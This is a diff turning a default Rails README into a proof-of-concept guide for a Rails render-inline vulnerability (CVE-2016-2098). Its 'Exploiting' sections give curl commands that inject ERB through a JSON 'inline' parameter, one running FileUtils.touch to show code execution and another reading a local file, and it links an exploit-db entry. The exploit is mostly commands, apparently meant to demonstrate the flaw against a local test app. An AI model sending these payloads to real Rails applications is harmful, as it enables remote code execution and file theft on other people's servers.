@@ -1,28 +1,18 @@
 == README
-
-This README would normally document whatever steps are necessary to get the
-application up and running.
-
-Things you may want to cover:
-
-* Ruby version
-
-* System dependencies
-
-* Configuration
-
-* Database creation
-
-* Database initialization
-
-* How to run the test suite
-
-* Services (job queues, cache servers, search engines, etc.)
-
-* Deployment instructions
-
-* ...
+Proof of concept for  https://groups.google.com/forum/#!topic/rubyonrails-security/ly-IH-fxr_Q
 
 
-Please feel free to use a different markup language if you do not plan to run
-<tt>rake doc:app</tt>.
+== Exploiting:
+1. You should only run rails server in a way that you are certain will not open you up to being exploited
+2. Run `rails s`
+3. Execute the following command
+`curl -v -H "Accept: application/json" -H "Content-type: application/json" -X GET -d ' {"id" : { "inline" : "<%= FileUtils.touch \"rooted\"%>"}}'  http://localhost:3000/exploits`
+4. Verify that the file "rooted" now exists in the project directory
+
+== Exploiting:
+1. Execute the following command
+`curl -v -H "Accept: application/json" -H "Content-type: application/json" -X GET -d ' {"id" : { "inline" : "<%= File.read \"dama_ouro.jpg\"%>"}}'  http://localhost:3000/exploits`
+2. https://www.exploit-db.com/exploits/40086/
+
+== Other:
+https://www.cvedetails.com/cve/CVE-2016-2098/
